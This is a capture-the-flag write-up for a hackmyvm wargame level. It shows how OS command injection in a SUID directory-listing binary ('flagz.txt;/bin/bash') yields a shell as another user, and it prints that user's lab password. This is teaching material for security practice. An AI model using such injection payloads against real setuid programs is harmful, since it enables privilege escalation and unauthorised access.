# 0x04
This write-up explains the steps taken to complete mission 0x04 on hades@hackmyvm.eu, starting from user `althea` and escalating to `andromeda`.

## Mission
As always, we read the objective first:
```bash
althea@hades:~$ cat mission.txt 
################
# MISSION 0x04 #
################

## EN ##
The user andromeda has left us a program to list directories.
```
This mission for this stage provided a program that may contain a vulnerability or a special mechanism that we needed to exploit.

## Method of solving
In the home directory, I found a binary named `lsme` and a file named `andromeda_pass.txt` that I initially could not access due to permission restrictions.
```bash
althea@hades:~$ ls -la
total 52
drwxr-x--- 2 root      althea     4096 Apr  5  2024 .
drwxr-xr-x 1 root      root       4096 Apr  5  2024 ..
-rw-r--r-- 1 althea    althea      220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 althea    althea     3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 althea    althea      807 Apr 23  2023 .profile
-r--r----- 1 andromeda andromeda    21 Apr  5  2024 andromeda_pass.txt
-rw-r----- 1 root      althea       22 Apr  5  2024 flagz.txt
-rwS--s--- 1 root      althea    16216 Apr  5  2024 lsme
-rw-r----- 1 root      althea      205 Apr  5  2024 mission.txt
```
The binary `lsme` had **SUID** bits set, takes user input (such as file or directory name) and executes a system command to list it. If the developers uses a function liek `system("ls " + user_input)`, the input is not sanitized and become vulnerable to OS command injection. This means we can append additional shell commands after characters like `;`, `&&`, or `|` to achieve arbitrary command execution.

First, try a simple injection.
```bash
althea@hades:~$ ./lsme
Enter file to check:
flagz.txt;whoami
-rw-r----- 1 root althea 22 Apr  5  2024 flagz.txt
andromeda
Segmentation fault
```
The result of that commands both lists the `flagz.txt` file to check its permissions and run `whoami` to print the name of the currently active user.
After that, we can run `/bin/bash` to spawn a shell as the user `andromeda`.
```bash
althea@hades:~$ ./lsme
Enter file to check:
flagz.txt;/bin/bash
-rw-r----- 1 root althea 22 Apr  5  2024 flagz.txt
```
The result of that command shows that we successfully logged in as the user `andromeda`.
```bash
andromeda@hades:~$ cat andromeda_pass.txt 
OTWGTbHzrxhYFSTlKcOt                <----- This is the retrieved password.
andromeda@hades:~$ id ; whoami
uid=2046(andromeda) gid=2045(althea) groups=2045(althea)
andromeda
```
With the identified password, we switched to user `andromeda` and get the flag.

## Key command
`./lsme`
`flagz.txt;whoami`

`./lsme`
`flagz.txt;/bin/bash`

***You are welcome!***
